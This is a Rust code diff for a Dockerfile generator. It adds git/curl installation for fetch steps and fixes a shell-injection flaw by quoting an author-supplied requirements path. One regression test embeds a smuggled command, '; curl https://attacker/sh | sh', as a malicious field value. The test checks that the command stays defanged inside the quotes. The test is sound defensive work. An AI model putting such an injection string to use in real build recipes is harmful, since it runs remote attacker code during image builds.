@@ -394,8 +394,16 @@ pub(crate) fn derive_dockerfile(
         ));
     }
 
-    // system packages: system union system_runtime, order-preserving dedup, one layer.
-    let apt = union_preserving_order(&build.system, &build.system_runtime);
+    // system packages: system union system_runtime, order-preserving dedup, one
+    // layer. A `fetch` needs its tool on PATH BEFORE its RUN, so fold in `git`
+    // (for a git fetch) / `curl` (for a url fetch) when the author did not list
+    // it -- appended after the author's union to keep the order deterministic.
+    let mut apt = union_preserving_order(&build.system, &build.system_runtime);
+    for tool in fetch_tools(&build.fetch) {
+        if !apt.iter().any(|name| name.as_str() == tool) {
+            apt.push(tool.to_string());
+        }
+    }
     out.push_str(&render_system_packages(&apt)?);
 
     // A non-python base (e.g. nvidia/cuda) has no `python` on PATH; symlink it.
@@ -455,6 +463,22 @@ fn install_verb(installer: &str) -> &'static str {
         "uv" => "uv pip install --system --no-cache-dir",
         _ => "python -m pip install --no-cache-dir",
     }
+}
+
+/// The apt packages a recipe's `fetch` steps need on PATH before they RUN:
+/// `git` if any fetch clones a repo, `curl` if any fetch downloads a url. Git
+/// precedes curl for a deterministic order; the caller dedups against any tool
+/// the author already listed. Stays within the Debian/apt assumption (a
+/// non-Debian base uses the `build.dockerfile` trapdoor).
+fn fetch_tools(fetches: &[Fetch]) -> Vec<&'static str> {
+    let mut tools = Vec::new();
+    if fetches.iter().any(|fetch| fetch.kind == "git") {
+        tools.push("git");
+    }
+    if fetches.iter().any(|fetch| fetch.kind == "url") {
+        tools.push("curl");
+    }
+    tools
 }
 
 /// Union two system-package lists preserving first-occurrence order.
@@ -540,7 +564,14 @@ fn render_fetch(fetch: &Fetch, verb: &str) -> Result<String, DeriveError> {
             };
             if let Some(req) = &fetch.pip_requirements {
                 validate_token("fetch.pip_requirements", req)?;
-                chain.push_str(&format!(" && {verb} -r {dest_q}/{req}"));
+                // Quote the WHOLE `dest/req` path as one shell argument. `req`
+                // is author-supplied and `validate_token` only rejects control
+                // characters, so an unquoted interpolation would let `req`
+                // smuggle a `;`/`|`/`$()` shell command into the build RUN.
+                chain.push_str(&format!(
+                    " && {verb} -r {}",
+                    shell_quote(&format!("{dest}/{req}"))
+                ));
             }
             if fetch.pip_install {
                 chain.push_str(&format!(" && {verb} -e {dest_q}"));
@@ -1096,6 +1127,81 @@ mod tests {
             "RUN git clone --depth=1 'https://github.com/x/R.git' '/opt/R' && python -m pip install --no-cache-dir -e '/opt/R' && rm -rf '/opt/R'/.git"
         ));
         assert!(!derived.contains("git init"));
+    }
+
+    #[test]
+    fn render_fetch_pip_requirements_is_shell_quoted() {
+        // `pip_requirements` is author-supplied and validate_token only rejects
+        // control chars, so the whole `dest/req` path must be one quoted shell
+        // arg -- otherwise shell metacharacters in `req` inject a command that
+        // runs during `docker build` (bypassing the no-build.commands gate).
+        let recipe = Recipe::from_json(
+            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r","pip_requirements":"requirements.txt; curl https://attacker/sh | sh"}]}}"#,
+        )
+        .expect("parses");
+        let derived = derive(&recipe).expect("derives");
+        // The path is emitted as a single quoted argument; the injected metachars
+        // stay INSIDE the quotes (defanged), so no bare `; ` / `| ` survives.
+        assert!(derived.contains(" -r '/opt/r/requirements.txt; curl https://attacker/sh | sh'"));
+        // The OLD unquoted form (dest_q then a bare /req) must NOT appear: that
+        // left the metacharacters outside the quotes as live shell syntax.
+        assert!(!derived.contains(" -r '/opt/r'/requirements.txt"));
+        // The injected `; curl ... | sh` lives only inside the single-quoted
+        // path argument, so the shell never parses it as a command separator.
+        // This fetch is unpinned (no ref), so the chain uses `git clone`.
+        let run_line = derived
+            .lines()
+            .find(|line| line.contains("git clone"))
+            .expect("git fetch RUN line");
+        assert!(run_line.contains(" -r '/opt/r/requirements.txt; curl https://attacker/sh | sh'"));
+    }
+
+    #[test]
+    fn derive_dockerfile_installs_git_for_a_git_fetch() {
+        // A git fetch needs `git` on PATH before its RUN; the deriver must add it
+        // to the apt step even when the author listed no system packages.
+        let recipe = Recipe::from_json(
+            r#"{"name":"a","build":{"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r"}]}}"#,
+        )
+        .expect("parses");
+        let derived = derive(&recipe).expect("derives");
+        // An apt step is emitted with git even though system/system_runtime were
+        // empty, and it precedes the git clone RUN.
+        let apt = derived
+            .find("apt-get install")
+            .expect("apt step is emitted for a fetch tool");
+        let clone = derived.find("git clone").expect("git fetch RUN");
+        assert!(apt < clone, "git must be installed before the clone RUN");
+        assert!(derived.contains("--no-install-recommends 'git' && rm -rf"));
+    }
+
+    #[test]
+    fn derive_dockerfile_installs_curl_for_a_url_fetch() {
+        let recipe = Recipe::from_json(
+            r#"{"name":"a","build":{"fetch":[{"kind":"url","url":"https://x/a.tar.gz","dest":"/opt/a.tar.gz"}]}}"#,
+        )
+        .expect("parses");
+        let derived = derive(&recipe).expect("derives");
+        assert!(derived.contains("--no-install-recommends 'curl' && rm -rf"));
+        let apt = derived
+            .find("apt-get install")
+            .expect("apt step is emitted for a fetch tool");
+        let curl = derived.find("curl -fsSL").expect("url fetch RUN");
+        assert!(apt < curl, "curl must be installed before the download RUN");
+    }
+
+    #[test]
+    fn derive_dockerfile_does_not_duplicate_an_already_listed_tool() {
+        // The author already lists git; the deriver must NOT add a second 'git'.
+        let recipe = Recipe::from_json(
+            r#"{"name":"a","build":{"system":["git","cmake"],"fetch":[{"kind":"git","repo":"https://x/r.git","dest":"/opt/r"}]}}"#,
+        )
+        .expect("parses");
+        let derived = derive(&recipe).expect("derives");
+        assert!(derived.contains(
+            "RUN apt-get update && apt-get install -y --no-install-recommends 'git' 'cmake' && rm -rf /var/lib/apt/lists/*"
+        ));
+        assert_eq!(derived.matches("'git'").count(), 1, "git must appear once");
     }
 
     #[test]
